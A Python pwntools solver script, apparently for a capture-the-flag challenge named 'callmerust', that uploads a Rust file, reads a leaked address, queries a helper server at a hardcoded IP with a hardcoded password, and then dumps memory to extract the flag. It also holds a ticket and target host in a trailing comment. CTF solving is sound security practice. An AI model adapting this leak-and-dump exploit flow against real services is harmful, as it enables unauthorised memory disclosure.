import os
import socket
import sys
import time
import struct
import socket

from pwn import *



def recvline(c):
    buf = b""
    while True:
        t = c.recv(1)
        if t == b"":
            raise Exception("c")
        else:
            if t == b"\n":
                return buf
            else:
                buf += t
def rrinv(v):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("34.31.41.231", 5434))
    s.sendall(b"supersecret12388hjdsdfmsduJJhs_12$k"+b"\n")
    s.sendall(str(v).encode("utf8")+b"\n")
    l = recvline(s)
    v1, v2 = map(int,l.strip().split())
    return v1,v2
def co2(a):
    a = a+0x7b0-11+256 -0x40
    m32 = pow(2,32)-1
    ru,fu = rrinv(((a&(m32<<16))>>16))
    l = a-(ru<<16)
    if l > 0x000fffff:
        raise Exception("e")
    return fu,l



def unpack_uint128_le(data):
    """Unpacks a 128-bit unsigned integer from little-endian byte data."""
    assert len(data) == 16, "Data must be exactly 16 bytes long."
    low, high = struct.unpack('<QQ', data)
    return (high << 64) | low
def pack_uint128_le(value):
    """Packs a 128-bit unsigned integer into 16-byte little-endian binary data."""
    assert 0 <= value < (1 << 128), "Value must fit in 128 bits."
    high = (value >> 64) & 0xFFFFFFFFFFFFFFFF
    low = value & 0xFFFFFFFFFFFFFFFF
    return struct.pack('<QQ', low, high)



if len(sys.argv) > 1 and sys.argv[1] == "local":
    p = process("docker run -it callmerust-challenge", shell=True, stdin=PTY)
else:
    HOST = os.environ["HOST"]
    PORT = int(os.environ["PORT"])
    TICKET = None if "TICKET" not in os.environ else os.environ["TICKET"]

    p = remote(HOST, PORT)

    if TICKET is not None:
        p.recv(len("Ticket please: "))
        p.send((TICKET + "\n").encode("utf-8"))
        time.sleep(1)

with open("sol1.rs", "rb") as fp:
    rust_content = fp.read()
rust_content = b"\n" + rust_content.strip() + b"\n"*5

print(p.recvline())
p.send(rust_content)
#while True:
#    print(repr(p.recvline()))
flistandfcontent = p.recvuntil(b"777 RONLY/:")
assert b"src/lib.rs" in flistandfcontent
assert b'println!("!");' in flistandfcontent
leak = int(p.recvline(),16)

t1 = time.time()
v1,v2=co2(leak)
print("elapsed remote time", time.time()-t1)
print(v1,v2)
p.send((str(v1)+"\n"+str(v2)+"\n").encode("utf-8"))


#while True:
#    print(repr(p.recvline()))
print(p.recvuntil(b"\n!"))
p.recvline()
p.recvuntil(b"0x")

buf = b""
for _ in range(16):
    vs = p.recvline().strip()
    print("-->", repr(vs))
    buf += pack_uint128_le(int(vs,16))
print(repr(buf))
print("OFFSET", buf.find(b"flag{"))
flag = b"flag{"+buf.split(b"flag{")[1].split(b"}")[0]+b"}"
assert (b"flag{" in flag and b"}" in flag)

print("-"*25, "SUCCESS!")
print("FLAG:", flag.decode("utf-8"))





#print("="*50)
#p.interactive()



'''

TICKET=ticket{22weatherdeckweatherdeckweatherdeck395452:wVwxj0-4YNNz_5zzjJYcLznP_tzEk6w7ugw6dsg-i2YMoc8k} HOST=172.171.201.87 PORT=1337 /usr/bin/time -vvv  python ./solver.py
'''



